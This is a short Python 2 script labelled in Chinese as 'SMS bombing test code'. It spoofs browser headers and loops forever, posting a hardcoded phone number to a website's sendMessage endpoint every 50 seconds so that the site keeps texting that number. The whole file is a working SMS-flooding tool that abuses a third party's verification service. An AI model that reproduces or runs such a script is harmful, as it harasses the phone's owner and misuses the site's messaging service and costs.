# message_bobm
#短信轰炸测试代码
import requests
import time
s = requests.Session()
data = "phone=13813351299" 
headers = {
    'UserAgent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Referer': 'http://www.otryin.com/',
}
while True:
    s.post(url="http://www.otryin.com/sendMessage", data=data,headers=headers)
    print '---'.join(['send message sucess', data])
    time.sleep(50)
